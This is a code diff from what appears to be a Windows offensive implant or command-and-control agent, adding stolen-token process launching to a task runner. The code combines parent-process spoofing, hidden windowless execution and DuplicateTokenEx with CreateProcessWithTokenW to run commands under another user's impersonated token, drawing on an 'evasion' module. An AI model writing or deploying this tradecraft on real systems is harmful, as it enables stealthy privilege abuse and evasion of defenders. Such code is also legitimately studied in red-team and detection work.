@@ -2,6 +2,8 @@
 #include "taskRunner.h"
 #include "evasion.h"
 #include <format>
+#include "Token.h"
+
 #define BUF_SIZE 4096
 namespace taskrunner {
 	string readFromPipe(HANDLE pipe_handle) {
@@ -20,12 +22,12 @@ namespace taskrunner {
 		}
 		return out;
 	}
-	string execute(const string& cmd, bool capture, int ppid) {
-		STARTUPINFOEXA si;
+	string execute(const string& cmd, bool capture, int ppid, bool usetoken) {
+		STARTUPINFOEXW si;
 		PROCESS_INFORMATION pi;
 		SIZE_T attributeSize;
 		HANDLE parentProcessHandle = INVALID_HANDLE_VALUE;
-		ZeroMemory(&si, sizeof(STARTUPINFOEXA));
+		ZeroMemory(&si, sizeof(STARTUPINFOEXW));
 		ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
 
 		HANDLE g_hChildStd_OUT_Rd = NULL;
@@ -40,7 +42,7 @@ namespace taskrunner {
 			si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attributeSize);
 			InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &attributeSize);
 			UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &parentProcessHandle, sizeof(HANDLE), NULL, NULL);
-			si.StartupInfo.cb = sizeof(STARTUPINFOEXA);
+			si.StartupInfo.cb = sizeof(STARTUPINFOEXW);
 		}
 		if (capture) {
 			SECURITY_ATTRIBUTES saAttr;
@@ -66,7 +68,18 @@ namespace taskrunner {
 			}
 			si.StartupInfo.dwFlags |= STARTF_USESTDHANDLES;
 		}
-		auto res = CreateProcessA(NULL, (LPSTR)cmd.c_str(), NULL, NULL, TRUE, EXTENDED_STARTUPINFO_PRESENT | CREATE_NO_WINDOW, NULL, NULL, &si.StartupInfo, &pi);
+		BOOL res = FALSE;
+		std::wstring wscmd(cmd.size(), L' '); // Overestimate number of code points.
+		wscmd.resize(std::mbstowcs(&wscmd[0], cmd.c_str(), cmd.size())); // Shrink to fit.
+		if (usetoken) {
+			HANDLE hPrimaryToken = INVALID_HANDLE_VALUE;
+			if(!DuplicateTokenEx(token::getToken(), MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &hPrimaryToken))
+				throw exception(std::format("[-] DuplicateTokenEx failed with error: {}", GetLastError()).c_str());
+			res = CreateProcessWithTokenW(hPrimaryToken, 0, NULL, (LPWSTR)wscmd.c_str(), EXTENDED_STARTUPINFO_PRESENT | CREATE_NO_WINDOW, NULL, NULL, &si.StartupInfo, &pi);
+		}
+		else {
+			res = CreateProcessW(NULL, (LPWSTR)wscmd.c_str(), NULL, NULL, TRUE, EXTENDED_STARTUPINFO_PRESENT | CREATE_NO_WINDOW, NULL, NULL, &si.StartupInfo, &pi);
+		}
 		if (!res) {
 			throw exception(std::format("[-] CreateProcessA failed with error: {}", GetLastError()).c_str());
 		}
